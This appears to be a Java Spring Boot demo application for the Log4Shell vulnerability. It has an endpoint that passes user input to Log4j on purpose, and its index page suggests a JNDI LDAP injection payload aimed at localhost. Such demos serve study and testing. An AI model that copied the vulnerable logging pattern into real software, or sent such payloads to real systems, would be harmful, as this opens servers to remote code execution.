package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
@RestController
public class LogController {
    private static final Logger logger = LogManager.getLogger(LogController.class);

    public static void main(String[] args) {
        SpringApplication.run(LogController.class, args);
    }

    @GetMapping("/vulnerable")
    public String logUserInput(@RequestParam String userInput) {
        logger.info("Received input: {}", userInput); // vulnerable log
        return "Logged input: " + userInput;
    }

    @GetMapping("/")
    public String index() {
        return "Log4Shell demo running. Try /vulnerable?userInput=${jndi:ldap://localhost:1389/a}";
    }
}